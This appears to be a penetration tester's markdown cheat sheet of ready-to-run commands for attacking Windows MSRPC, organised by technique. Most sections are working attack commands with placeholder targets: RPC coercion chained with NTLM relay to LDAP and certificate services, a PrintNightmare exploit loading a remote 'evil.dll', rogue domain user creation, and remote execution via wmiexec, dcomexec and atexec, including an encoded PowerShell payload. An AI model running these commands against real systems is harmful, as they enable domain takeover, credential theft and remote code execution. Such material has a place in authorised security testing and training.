---
id: "m3uoexqthmpn0sgrq"
title: "RPC-MSRPC.md"
description: ""
tags: []
order: 8
createdAt: "2026-05-26T19:20:18.662Z"
updatedAt: "2026-05-26T19:20:58.616Z"
---

## Recon & Enumeration
<!-- section: {"id":"l7f4hkhi8mpn0tber","order":0,"collapsed":false} -->

### 4zl6nximumpn0tbh1
```bash
nmap -sV -sC -p 135,593 $TARGET
nmap -sV -p 135 --script msrpc-enum $TARGET
rustscan -a $TARGET -p 135,593 -- -sV -sC
nmap -sV -p 135,445,593 --script rpc-grind $TARGET
```

_Recon & Enumeration Initial RPC port detection and fingerprinting._

**Tags:** rpc, recon, nmap, rustscan
<!-- cmd: {"id":"4zl6nximumpn0tbh1","language":"bash","sectionId":"l7f4hkhi8mpn0tber","tags":["rpc","recon","nmap","rustscan"]} -->

### gpdj9e2j8mpn0tbh5
```bash
impacket-rpcdump $TARGET
impacket-rpcdump $DOMAIN/$USER:$PASS@$TARGET
impacket-rpcdump @$TARGET | grep -i "ms-rprn\|ms-par\|ms-efsr\|ms-fsrvp\|ms-dfsnm"
```

_Tags: #rpc, #recon, #nmap, #rustscan Enumerate all RPC endpoints._

**Tags:** rpc, rpcdump, enum, impacket, endpoints
<!-- cmd: {"id":"gpdj9e2j8mpn0tbh5","language":"bash","sectionId":"l7f4hkhi8mpn0tber","tags":["rpc","rpcdump","enum","impacket","endpoints"]} -->

### 60e6tv2jpmpn0tbh9
```bash
nmap -sV -p 135 --script msrpc-enum $TARGET
nmap -p 135 --script rpc-grind $TARGET
nmap -p 135,445 --script smb-enum-services $TARGET
```

_Tags: #rpc, #rpcdump, #enum, #impacket, #endpoints Enumerate RPC via nmap NSE._

**Tags:** rpc, nmap, nse, enum, recon
<!-- cmd: {"id":"60e6tv2jpmpn0tbh9","language":"bash","sectionId":"l7f4hkhi8mpn0tber","tags":["rpc","nmap","nse","enum","recon"]} -->

## rpcclient Enumeration
<!-- section: {"id":"j5jz1geh5mpn0tbez","order":1,"collapsed":false} -->

### wcrp2detxmpn0tbhm
```bash
rpcclient -U "" -N $TARGET
rpcclient -U "" -N $TARGET -c "enumdomusers"
rpcclient -U "" -N $TARGET -c "enumdomgroups"
rpcclient -U "" -N $TARGET -c "querydominfo"
rpcclient -U "" -N $TARGET -c "enumprinters"
rpcclient -U "" -N $TARGET -c "netshareenum"
rpcclient -U "" -N $TARGET -c "lsaenumsid"
```

_rpcclient Enumeration Unauthenticated enumeration via rpcclient._

**Tags:** rpc, rpcclient, nullsession, unauthenticated, enum
<!-- cmd: {"id":"wcrp2detxmpn0tbhm","language":"bash","sectionId":"j5jz1geh5mpn0tbez","tags":["rpc","rpcclient","nullsession","unauthenticated","enum"]} -->

### gpwg0lfrpmpn0tbhq
```bash
rpcclient -U "$USER%$PASS" $TARGET
rpcclient -U "$DOMAIN/$USER%$PASS" $TARGET

# Users
rpcclient -U "$USER%$PASS" $TARGET -c "enumdomusers"
rpcclient -U "$USER%$PASS" $TARGET -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v 0x

# Groups
rpcclient -U "$USER%$PASS" $TARGET -c "enumdomgroups"
rpcclient -U "$USER%$PASS" $TARGET -c "querygroup 0x200"

# User details
rpcclient -U "$USER%$PASS" $TARGET -c "queryuser $USER"
rpcclient -U "$USER%$PASS" $TARGET -c "getusrdompwinfo $RID"

# Domain info
rpcclient -U "$USER%$PASS" $TARGET -c "querydominfo"
rpcclient -U "$USER%$PASS" $TARGET -c "getdompwinfo"

# Shares
rpcclient -U "$USER%$PASS" $TARGET -c "netshareenum"
rpcclient -U "$USER%$PASS" $TARGET -c "netshareenumall"
```

_Tags: #rpc, #rpcclient, #nullsession, #unauthenticated, #enum Authenticated enumeration via rpcclient._

**Tags:** rpc, rpcclient, authenticated, enum, users, groups, shares
<!-- cmd: {"id":"gpwg0lfrpmpn0tbhq","language":"bash","sectionId":"j5jz1geh5mpn0tbez","tags":["rpc","rpcclient","authenticated","enum","users","groups","shares"]} -->

### 0fvnon5qgmpn0tbht
```bash
rpcclient -U "$USER%$PASS" $TARGET -c "lsaenumsid"
rpcclient -U "$USER%$PASS" $TARGET -c "lookupsids $SID"
rpcclient -U "$USER%$PASS" $TARGET -c "lookupnames administrator"
rpcclient -U "$USER%$PASS" $TARGET -c "enumprivs"
rpcclient -U "$USER%$PASS" $TARGET -c "lsaenumacctrights $SID"
```

_Tags: #rpc, #rpcclient, #authenticated, #enum, #users, #groups, #shares Enumerate LSA secrets and privileges via rpcclient._

**Tags:** rpc, rpcclient, lsa, privileges, sid, enum
<!-- cmd: {"id":"0fvnon5qgmpn0tbht","language":"bash","sectionId":"j5jz1geh5mpn0tbez","tags":["rpc","rpcclient","lsa","privileges","sid","enum"]} -->

## RID Cycling
<!-- section: {"id":"2lhtfzagimpn0tbf2","order":2,"collapsed":false} -->

### jxn2qe9ntmpn0tbi2
```bash
# rpcclient manual RID cycling
for rid in $(seq 500 1200); do
  rpcclient -U "$USER%$PASS" $TARGET -c "queryuser $rid" 2>/dev/null | grep -i "user name"
done

# Automated
impacket-lookupsid $DOMAIN/$USER:$PASS@$TARGET
impacket-lookupsid $DOMAIN/$USER:$PASS@$TARGET 2000
impacket-lookupsid anonymous@$TARGET
netexec smb $TARGET -u '' -p '' --rid-brute
netexec smb $TARGET -u $USER -p $PASS --rid-brute 5000
```

_RID Cycling Enumerate users via RID bruteforce._

**Tags:** rpc, rid-cycling, users, enum, impacket, netexec
<!-- cmd: {"id":"jxn2qe9ntmpn0tbi2","language":"bash","sectionId":"2lhtfzagimpn0tbf2","tags":["rpc","rid-cycling","users","enum","impacket","netexec"]} -->

## MS-RPRN — Print Spooler Abuse
<!-- section: {"id":"6i027kcjompn0tbf6","order":3,"collapsed":false} -->

### wr7sy9k73mpn0tbi8
```bash
impacket-rpcdump $TARGET | grep -i "MS-RPRN"
impacket-rpcdump $TARGET | grep -i "12345678-1234-abcd-ef00-0123456789ab"
rpcclient -U "$USER%$PASS" $TARGET -c "enumprinters"

# Check via netexec
netexec smb $TARGET -u $USER -p $PASS -M spooler
```

_MS-RPRN — Print Spooler Abuse Check if Print Spooler is running (coercion surface)._

**Tags:** rpc, ms-rprn, spooler, coercion, enum, netexec
<!-- cmd: {"id":"wr7sy9k73mpn0tbi8","language":"bash","sectionId":"6i027kcjompn0tbf6","tags":["rpc","ms-rprn","spooler","coercion","enum","netexec"]} -->

### kk24v5dm2mpn0tbid
```bash
# Trigger coercion to attacker host
impacket-rpcdump $TARGET | grep -i MS-RPRN
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LHOST
python3 SpoolSample.py $TARGET $LHOST

# Combined with Responder for hash capture
responder -I $INTERFACE -dwv
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET $LHOST
```

_Tags: #rpc, #ms-rprn, #spooler, #coercion, #enum, #netexec Trigger authentication via PrinterBug (SpoolSample)._

**Tags:** rpc, printerbug, spoolsample, coercion, hash-capture, responder, ms-rprn
<!-- cmd: {"id":"kk24v5dm2mpn0tbid","language":"bash","sectionId":"6i027kcjompn0tbf6","tags":["rpc","printerbug","spoolsample","coercion","hash-capture","responder","ms-rprn"]} -->

## MS-EFSR — PetitPotam
<!-- section: {"id":"zwhrxhdvnmpn0tbf9","order":4,"collapsed":false} -->

### dxzjq0wv6mpn0tbio
```bash
# Check MS-EFSR availability
impacket-rpcdump $TARGET | grep -i "MS-EFSR\|c681d488-d850-11d0-8c52-00c04fd90f7e"

# Unauthenticated coercion (unpatched)
impacket-PetitPotam $LHOST $TARGET
impacket-PetitPotam -pipe efsr $LHOST $TARGET

# Authenticated coercion
impacket-PetitPotam -u $USER -p $PASS -d $DOMAIN $LHOST $TARGET
```

_MS-EFSR — PetitPotam Abuse Encrypting File System RPC for coercion._

**Tags:** rpc, petitpotam, ms-efsr, coercion, ntlm, unauthenticated
<!-- cmd: {"id":"dxzjq0wv6mpn0tbio","language":"bash","sectionId":"zwhrxhdvnmpn0tbf9","tags":["rpc","petitpotam","ms-efsr","coercion","ntlm","unauthenticated"]} -->

## MS-DFSNM — DFSCoerce
<!-- section: {"id":"0jo1eogtympn0tbfc","order":5,"collapsed":false} -->

### beo1cux0cmpn0tbiv
```bash
# Check MS-DFSNM
impacket-rpcdump $TARGET | grep -i "MS-DFSNM\|4fc742e0-4a10-11cf-8273-00aa004ae673"

# Coerce authentication
python3 dfscoerce.py -u $USER -p $PASS -d $DOMAIN $LHOST $TARGET
```

_MS-DFSNM — DFSCoerce Abuse Distributed File System Namespace for coercion._

**Tags:** rpc, dfscoerce, ms-dfsnm, coercion, ntlm
<!-- cmd: {"id":"beo1cux0cmpn0tbiv","language":"bash","sectionId":"0jo1eogtympn0tbfc","tags":["rpc","dfscoerce","ms-dfsnm","coercion","ntlm"]} -->

## MS-FSRVP — ShadowCoerce
<!-- section: {"id":"qdj6tlmismpn0tbfg","order":6,"collapsed":false} -->

### 1vcazmo8empn0tbj2
```bash
# Check MS-FSRVP
impacket-rpcdump $TARGET | grep -i "MS-FSRVP\|a8e0653c-2744-4389-a61d-7373df8b2292"

# Coerce authentication
python3 shadowcoerce.py -u $USER -p $PASS -d $DOMAIN $LHOST $TARGET
```

_MS-FSRVP — ShadowCoerce Abuse File Server Remote VSS Protocol for coercion._

**Tags:** rpc, shadowcoerce, ms-fsrvp, coercion, ntlm
<!-- cmd: {"id":"1vcazmo8empn0tbj2","language":"bash","sectionId":"qdj6tlmismpn0tbfg","tags":["rpc","shadowcoerce","ms-fsrvp","coercion","ntlm"]} -->

## Coercer — All-in-One Coercion
<!-- section: {"id":"0lcc4pzfrmpn0tbfj","order":7,"collapsed":false} -->

### cm2dg64jvmpn0tbjd
```bash
# Scan for available coercion methods
coercer scan -u $USER -p $PASS -d $DOMAIN -t $TARGET
coercer scan -u $USER -p $PASS -d $DOMAIN -t $TARGET --filter-protocol-name MS-RPRN

# Coerce authentication
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $TARGET
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $TARGET --filter-protocol-name MS-EFSR

# Coerce with specific listener port
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $TARGET --listener-port 445
```

_Coercer — All-in-One Coercion Scan and exploit all available coercion methods._

**Tags:** rpc, coercer, coercion, ms-rprn, ms-efsr, ms-dfsnm, ntlm-relay
<!-- cmd: {"id":"cm2dg64jvmpn0tbjd","language":"bash","sectionId":"0lcc4pzfrmpn0tbfj","tags":["rpc","coercer","coercion","ms-rprn","ms-efsr","ms-dfsnm","ntlm-relay"]} -->

## NTLM Relay via RPC Coercion
<!-- section: {"id":"z27crhqlfmpn0tbfn","order":8,"collapsed":false} -->

### 3hk9kl3gvmpn0tbjj
```bash
# Terminal 1 — Start relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
impacket-ntlmrelayx -t ldap://$DC --no-wcf-server -smb2support --escalate-user $USER
impacket-ntlmrelayx -t ldaps://$DC --shadow-credentials --shadow-target "$TARGET_MACHINE$"
impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template "DomainController"

# Terminal 2 — Coerce
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $DC
impacket-PetitPotam $LHOST $DC
python3 printerbug.py $DOMAIN/$USER:$PASS@$DC $LHOST
```

_NTLM Relay via RPC Coercion Chain coercion with NTLM relay for full attack._

**Tags:** rpc, ntlm-relay, coercion, ntlmrelayx, petitpotam, coercer, ad-abuse
<!-- cmd: {"id":"3hk9kl3gvmpn0tbjj","language":"bash","sectionId":"z27crhqlfmpn0tbfn","tags":["rpc","ntlm-relay","coercion","ntlmrelayx","petitpotam","coercer","ad-abuse"]} -->

## RPC User Management Abuse
<!-- section: {"id":"5dvz87ytnmpn0tbfr","order":9,"collapsed":false} -->

### f9ybfal0ompn0tbjv
```bash
# Create new domain user
rpcclient -U "$USER%$PASS" $TARGET -c "createdomuser $NEW_USER"
rpcclient -U "$USER%$PASS" $TARGET -c "setuserinfo2 $NEW_USER 24 'Password123!'"

# Add user to group
rpcclient -U "$USER%$PASS" $TARGET -c "addgroupmem 0x200 $RID"

# Change user password
rpcclient -U "$USER%$PASS" $TARGET -c "chgpasswd $TARGET_USER $OLD_PASS $NEW_PASS"
rpcclient -U "$USER%$PASS" $TARGET -c "setuserinfo2 $TARGET_USER 24 '$NEW_PASS'"

# Delete user
rpcclient -U "$USER%$PASS" $TARGET -c "deletedomuser $TARGET_USER"
```

_RPC User Management Abuse Create and modify users via RPC (if permitted)._

**Tags:** rpc, rpcclient, user-management, privilege-escalation, ad-abuse
<!-- cmd: {"id":"f9ybfal0ompn0tbjv","language":"bash","sectionId":"5dvz87ytnmpn0tbfr","tags":["rpc","rpcclient","user-management","privilege-escalation","ad-abuse"]} -->

## RPC Printer Exploitation
<!-- section: {"id":"4hccvr6r4mpn0tbfu","order":10,"collapsed":false} -->

### d8ws2bnc7mpn0tbk3
```bash
# Enumerate printers
rpcclient -U "$USER%$PASS" $TARGET -c "enumprinters"
rpcclient -U "$USER%$PASS" $TARGET -c "getprinter"

# PrintNightmare check
impacket-rpcdump $TARGET | grep -i "MS-RPRN"
netexec smb $TARGET -u $USER -p $PASS -M printnightmare

# PrintNightmare exploit (CVE-2021-1675 / CVE-2021-34527)
python3 CVE-2021-1675.py $DOMAIN/$USER:$PASS@$TARGET '\\$LHOST\share\evil.dll'
```

_RPC Printer Exploitation Enumerate and abuse printer-related RPC calls._

**Tags:** rpc, printnightmare, cve-2021-1675, ms-rprn, exploit, privilege-escalation
<!-- cmd: {"id":"d8ws2bnc7mpn0tbk3","language":"bash","sectionId":"4hccvr6r4mpn0tbfu","tags":["rpc","printnightmare","cve-2021-1675","ms-rprn","exploit","privilege-escalation"]} -->

## WMI via RPC (DCOM)
<!-- section: {"id":"5doa003n9mpn0tbfy","order":11,"collapsed":false} -->

### pzgdf9cjpmpn0tbka
```bash
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$HASH
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET -shell-type powershell
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET "whoami /all"

# DCOM execution
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET -object MMC20
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET -object ShellWindows
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET -object ShellBrowserWindow
```

_WMI via RPC (DCOM) Execute commands via WMI over RPC._

**Tags:** rpc, wmi, dcom, wmiexec, dcomexec, impacket, lateral-movement, rce
<!-- cmd: {"id":"pzgdf9cjpmpn0tbka","language":"bash","sectionId":"5doa003n9mpn0tbfy","tags":["rpc","wmi","dcom","wmiexec","dcomexec","impacket","lateral-movement","rce"]} -->

## AT / Task Scheduler via RPC
<!-- section: {"id":"8triayyaumpn0tbg0","order":12,"collapsed":false} -->

### 466iaoqufmpn0tbkg
```bash
impacket-atexec $DOMAIN/$USER:$PASS@$TARGET "whoami > C:\output.txt"
impacket-atexec $DOMAIN/$USER@$TARGET -hashes :$HASH "net user hacker Password123! /add"
impacket-atexec $DOMAIN/$USER:$PASS@$TARGET "powershell -e $BASE64_PAYLOAD"

# Via netexec
netexec smb $TARGET -u $USER -p $PASS -M schtask_as -o USER=$USER CMD="whoami"
```

_AT / Task Scheduler via RPC Schedule tasks remotely via RPC._

**Tags:** rpc, atexec, schtask, lateral-movement, rce, impacket
<!-- cmd: {"id":"466iaoqufmpn0tbkg","language":"bash","sectionId":"8triayyaumpn0tbg0","tags":["rpc","atexec","schtask","lateral-movement","rce","impacket"]} -->

## DCE/RPC Interface Abuse
<!-- section: {"id":"jyod12v2bmpn0tbg4","order":13,"collapsed":false} -->

### f6m1hnyq5mpn0tbkn
```bash
# Dump all interfaces
impacket-rpcdump $TARGET | grep -E "uuid|ncacn"

# Query specific interface
impacket-ifmap $TARGET
impacket-ifmap $DOMAIN/$USER:$PASS@$TARGET

# Check dangerous interfaces
impacket-rpcdump $TARGET | grep -iE \
  "MS-RPRN|MS-EFSR|MS-FSRVP|MS-DFSNM|MS-NRPC|MS-SAMR|MS-LSAD|MS-DRSR"
```

_DCE/RPC Interface Abuse Query specific RPC interfaces._

**Tags:** rpc, dce, interfaces, enum, impacket
<!-- cmd: {"id":"f6m1hnyq5mpn0tbkn","language":"bash","sectionId":"jyod12v2bmpn0tbg4","tags":["rpc","dce","interfaces","enum","impacket"]} -->

## SAMR — User & Password Enumeration
<!-- section: {"id":"x665hoevkmpn0tbg7","order":14,"collapsed":false} -->

### eus69y12qmpn0tbku
```bash
# User enumeration via SAMR
impacket-samrdump $TARGET
impacket-samrdump $DOMAIN/$USER:$PASS@$TARGET
impacket-samrdump anonymous@$TARGET

# Via rpcclient
rpcclient -U "$USER%$PASS" $TARGET -c "enumdomusers"
rpcclient -U "$USER%$PASS" $TARGET -c "enumdomgroups"
rpcclient -U "$USER%$PASS" $TARGET -c "enumalsgroups domain"
rpcclient -U "$USER%$PASS" $TARGET -c "enumalsgroups builtin"
```

_SAMR — User & Password Enumeration Enumerate users via MS-SAMR._

**Tags:** rpc, samr, users, enum, impacket, rpcclient
<!-- cmd: {"id":"eus69y12qmpn0tbku","language":"bash","sectionId":"x665hoevkmpn0tbg7","tags":["rpc","samr","users","enum","impacket","rpcclient"]} -->

### gsi0mqgm3mpn0tbky
```bash
rpcclient -U "$USER%$PASS" $TARGET -c "getdompwinfo"
rpcclient -U "$USER%$PASS" $TARGET -c "querydominfo"
netexec smb $TARGET -u $USER -p $PASS --pass-pol
```

_Tags: #rpc, #samr, #users, #enum, #impacket, #rpcclient Password policy via SAMR._

**Tags:** rpc, samr, password-policy, enum, rpcclient, netexec
<!-- cmd: {"id":"gsi0mqgm3mpn0tbky","language":"bash","sectionId":"x665hoevkmpn0tbg7","tags":["rpc","samr","password-policy","enum","rpcclient","netexec"]} -->

## Vulnerability Checks
<!-- section: {"id":"q6emhswuxmpn0tbgb","order":15,"collapsed":false} -->

### 5lnia6y0mmpn0tblb
```bash
# MS03-026 / CVE-2003-0352 — DCOM RPC overflow
nmap -p 135 --script msrpc-enum $TARGET

# PrintNightmare
netexec smb $TARGET -u $USER -p $PASS -M printnightmare
impacket-rpcdump $TARGET | grep -i MS-RPRN

# PetitPotam unauthenticated
impacket-PetitPotam $LHOST $TARGET 2>&1 | grep -i "success\|error"

# ZeroLogon via RPC
netexec smb $DC -u '' -p '' -M zerologon

# MS-NRPC abuse check
impacket-rpcdump $TARGET | grep -i "MS-NRPC\|12345678-1234-abcd-ef00-01234567cffb"
```

_Vulnerability Checks Check for common RPC vulnerabilities._

**Tags:** rpc, vuln-check, printnightmare, petitpotam, zerologon, ms-nrpc, nmap
<!-- cmd: {"id":"5lnia6y0mmpn0tblb","language":"bash","sectionId":"q6emhswuxmpn0tbgb","tags":["rpc","vuln-check","printnightmare","petitpotam","zerologon","ms-nrpc","nmap"]} -->

## Misconfigurations Checklist
<!-- section: {"id":"m1o974m0tmpn0tbge","order":16,"collapsed":false} -->

### 8j3rna0avmpn0tblk
```bash
# 1. Enumerate all RPC endpoints
impacket-rpcdump $TARGET | grep -iE "MS-RPRN|MS-EFSR|MS-FSRVP|MS-DFSNM"

# 2. Null session via RPC
rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null

# 3. Print Spooler running
netexec smb $TARGET -u $USER -p $PASS -M spooler

# 4. Coercion methods available
coercer scan -u $USER -p $PASS -d $DOMAIN -t $TARGET

# 5. PrintNightmare
netexec smb $TARGET -u $USER -p $PASS -M printnightmare

# 6. PetitPotam unauthenticated
impacket-PetitPotam $LHOST $TARGET 2>&1 | head -5

# 7. SAMR user enumeration
impacket-samrdump anonymous@$TARGET 2>/dev/null | head -20

# 8. Password policy exposed
rpcclient -U "" -N $TARGET -c "getdompwinfo" 2>/dev/null
```

_Misconfigurations Checklist Quick RPC misconfiguration sweep._

**Tags:** rpc, misconfiguration, checklist, spooler, petitpotam, samr, coercion, nullsession
<!-- cmd: {"id":"8j3rna0avmpn0tblk","language":"bash","sectionId":"m1o974m0tmpn0tbge","tags":["rpc","misconfiguration","checklist","spooler","petitpotam","samr","coercion","nullsession"]} -->
